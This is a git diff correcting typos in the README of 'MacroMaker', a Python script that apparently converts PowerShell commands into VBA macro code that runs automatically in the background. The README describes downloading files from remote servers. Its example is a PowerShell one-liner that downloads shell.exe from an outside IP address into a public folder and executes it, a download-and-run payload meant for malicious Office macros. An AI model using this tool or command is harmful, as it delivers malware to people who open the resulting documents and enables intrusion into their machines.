@@ -12,7 +12,7 @@
 ### what is MacroMaker-
 -------------------------------------
  * MacroMake is Script witten by python3 help to genertate  VBA  code ready to use
-  - MacroMaker Take the powershell command as  aragnent  then will treanset the command to VBA code,  
+  - MacroMaker Take the powershell command as  arguments then will  transfer the command to VBA code,  
   ready to  executed automatically any command  in  background
     - Executes PowerShell   or Uses networking capabilities to download files from remote servers ..etc
  * MacroMaker have to way to Gentate thr VBA code 
@@ -35,7 +35,7 @@
  * to see the help list MacroMaker.py -h/--help
  ## explain :-
 ----------------------------------------
- incace i need to download file and exctue after download i use powershaell  - 
+ in case  need to download file and exctue after download i use powershaell  - 
  ```
  (New-Object Net.WebClient).DownloadFile('http://10.195.100.221:8000/shell.exe',' C:\Users\Public\Documents\shell.exe');Start-Process (' C:\Users\Public\Documents\shell.exe')
  ```
